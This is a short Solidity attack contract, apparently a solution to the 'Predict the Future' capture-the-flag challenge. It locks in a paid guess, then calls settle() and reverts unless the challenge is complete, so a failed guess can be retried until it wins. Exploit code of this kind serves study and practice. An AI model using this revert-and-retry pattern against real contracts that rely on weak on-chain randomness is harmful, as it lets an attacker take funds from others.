pragma solidity ^0.8.0;

interface IPredictTheFuture {
    
    function settle() external;

    function isComplete() external view returns(bool);

    function lockInGuess(uint8 n) external payable; 
}

contract PredictTheFutureAttack {

    IPredictTheFuture challenge;

    constructor(address _challenge) {
        challenge = IPredictTheFuture(_challenge);
    }

    function lockIn(uint8 n) external payable {
        require(msg.value >= 1 ether, "Insufficient amount");
        challenge.lockInGuess{value: 1 ether}(n);
    }

    function attack() external {
        challenge.settle();
        require(challenge.isComplete());

        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable{}
}